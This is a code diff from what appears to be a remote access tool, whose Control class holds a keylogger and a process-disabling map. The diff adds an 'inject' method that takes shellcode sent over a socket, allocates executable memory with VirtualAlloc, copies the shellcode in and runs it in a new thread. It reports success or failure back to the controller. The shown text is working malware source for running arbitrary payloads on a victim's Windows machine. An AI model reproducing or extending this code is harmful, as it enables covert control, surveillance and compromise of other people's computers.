@@ -53,6 +53,32 @@ class Control:
         self.logger = Keylogger()
         self.disabled_processes = {}
 
+    # currently, only works on x86 python, currently no solution including one below has worked with x64
+    # https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
+    def inject(self, shellcode):
+        if ctypes.sizeof(ctypes.c_voidp) != 4:
+            self.socket.send_json(ERROR, "This feature is only supported with x86 python")
+        else:
+            try:
+                shellcode = bytearray(shellcode)
+
+                ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+                ctypes.windll.kernel32.RtlMoveMemory.argTypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
+
+                ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)),
+                                                          ctypes.c_int(0x3000), ctypes.c_int(0x40))
+
+                buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))
+
+                ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0),
+                                                    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+            except Exception as e:
+                self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
+            else:
+                self.socket.send_json(SUCCESS)
+
     def toggle_disable_process(self, process):
         process = process.lower()
 
